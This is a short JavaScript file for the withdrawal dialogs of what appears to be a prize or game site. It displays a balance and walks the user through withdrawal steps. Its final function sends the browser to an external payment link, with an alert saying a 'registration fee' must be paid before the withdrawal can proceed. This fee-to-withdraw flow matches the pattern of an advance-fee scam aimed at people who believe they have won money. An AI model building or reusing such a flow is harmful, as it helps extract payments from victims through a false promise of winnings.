// to close all modals
function closeModals() {
  winner.style.display = "none";
}

// Show modal
function showModal(currentBalance) {
  document.getElementById("withdrawalModal").style.display = "block";
  document.getElementById("money-amount").innerText = "$" + currentBalance;
}

// Close modal
function closeModal() {
  document.getElementById("withdrawalModal").style.display = "none";
}

// Go to step 2 in modal
function goToStep2() {
  document.getElementById("withdrawalStep1").classList.add("hidden");
  document.getElementById("withdrawalStep2").classList.remove("hidden");
  document.querySelector(".back").classList.remove("hidden");
}

// Complete withdrawal process
function completeWithdrawal() {
  window.location.href = "https://go.perfectpay.com.br/PPU38CORIT3";
  alert(
    "Please complete the registration fee to proceed. You are being redirected to the registrations site"
  );
  // You can add the logic to handle the registration fee here
}

function goBack() {
  document.getElementById("withdrawalStep1").classList.remove("hidden");
  document.getElementById("withdrawalStep2").classList.add("hidden");
  document.querySelector(".back").classList.add("hidden"); // Hide the back button
}
